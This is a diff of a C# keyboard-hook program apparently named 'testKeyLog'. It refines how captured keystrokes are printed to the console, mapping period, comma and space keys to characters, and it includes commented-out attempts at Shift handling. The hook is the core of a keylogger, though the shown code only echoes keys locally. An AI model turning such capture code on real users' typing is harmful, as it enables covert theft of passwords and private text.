@@ -30,8 +30,32 @@ namespace testKeyLog
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                Console.Out.Write((Keys)vkCode);
-            }
+                if (((Keys)vkCode).ToString() == "OemPeriod") 
+                {
+                    Console.Out.Write(".");
+                }
+                else if (((Keys)vkCode).ToString() == "Oemcomma")
+                {
+                    Console.Out.Write(",");
+                }
+                else if (((Keys)vkCode).ToString() == "Space")
+                {
+                    Console.Out.Write(" ");
+                }
+                //else if (((Keys)vkCode == Keys.LShiftKey || (Keys)vkCode == Keys.RShiftKey) && Control.ModifierKeys == Keys.Shift && ((Keys)vkCode == Keys.D1))
+                //{
+                //    Console.Out.Write("!");
+                //}
+                //else if (((Keys)vkCode).ToString() == "LShiftD1" || ((Keys)vkCode).ToString() == "RShiftD1")
+                //{
+                //    Console.Out.Write("!");
+                //}
+                else
+                {
+                    Console.Out.Write((Keys)vkCode);
+                }
+
+        }
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
